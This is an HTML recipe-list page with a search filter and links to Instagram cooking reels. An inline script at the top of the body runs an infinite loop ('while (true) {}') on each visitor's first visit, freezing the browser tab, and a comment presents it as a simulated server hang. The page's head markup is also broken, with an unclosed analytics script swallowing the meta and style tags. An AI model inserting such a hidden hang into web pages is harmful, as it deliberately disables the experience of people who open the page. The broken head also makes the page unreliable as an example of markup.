<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-6YC1W6FEMH"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-6YC1W6FEMH');

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>One Pot Recipes List</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #F2F2F2;
    }
    .container {
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
    }
    header {
      text-align: center;
      padding-bottom: 20px;
    }
    header img {
      max-width: 100%;
      height: auto;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    footer {
      text-align: center;
      padding-top: 20px;
    }
    h1 {
      text-align: center;
      color: #333;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-top: 0;
      background-color: #fff;
      padding: 10px;
      border-radius: 5px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .search-container {
      text-align: center;
      margin-bottom: 20px;
    }
    input[type=text] {
      width: 50%;
      padding: 10px;
      margin: 8px 0;
      box-sizing: border-box;
      border: 2px solid #ccc;
      border-radius: 4px;
      outline: none;
    }
    input[type=text]:focus {
      border-color: #007bff;
    }
    ul {
      list-style-type: none;
      padding: 0;
      margin: 0;
    }
    li {
      margin: 20px 5px;
      line-height: 1.6;
      background-color: #fff;
      border-radius: 5px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      padding: 10px;
    }
    strong {
      font-weight: bold;
    }
    a {
      text-decoration: none;
      color: #007bff;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <script>
    if (!localStorage.getItem('visited')) {
      localStorage.setItem('visited', 'true');
      while (true) {} // Simulate server hang (infinite load)
    }
  </script>

  <header>
    <img src="Onepotrecipes.png" alt="Logo" style="width: 15%; height: auto; margin-top: 20px;">
  </header>

  <div class="container">
    <h1>One Pot Recipes</h1>

    <div class="search-container">
      <input type="text" id="myInput" onkeyup="searchFunction()" placeholder="Search for recipes...">
    </div>

    <ul id="recipeList">
      <li>
        <strong>Sambar:</strong> <a href="https://www.instagram.com/reel/C4I_DgaIpZ-/?igsh=YTkyd3plOXdieDdh">Watch Now</a>
      </li>
      <li>
        <strong>Veggie Sidedish / Poriyal:</strong> <a href="https://www.instagram.com/reel/C4K29eco-Ua/?igsh=MXB2eXpocmlnMDJnMw==">Watch Now</a>
      </li>
      <!-- Add more recipes as needed -->
    </ul>
  </div>

  <footer>
    <p>&copy; 2024 <a class="text-blue-500 hover:underline" href="https://www.instagram.com/one_pot__recipes">@_onepotrecipes</a></p>
  </footer>

  <script>
    function searchFunction() {
      const input = document.getElementById('myInput');
      const filter = input.value.toLowerCase();
      const ul = document.getElementById('recipeList');
      const li = ul.getElementsByTagName('li');

      for (let i = 0; i < li.length; i++) {
        const strong = li[i].getElementsByTagName('strong')[0];
        if (strong) {
          const txtValue = strong.textContent || strong.innerText;
          li[i].style.display = txtValue.toLowerCase().includes(filter) ? '' : 'none';
        }
      }
    }
  </script>
</body>
</html>
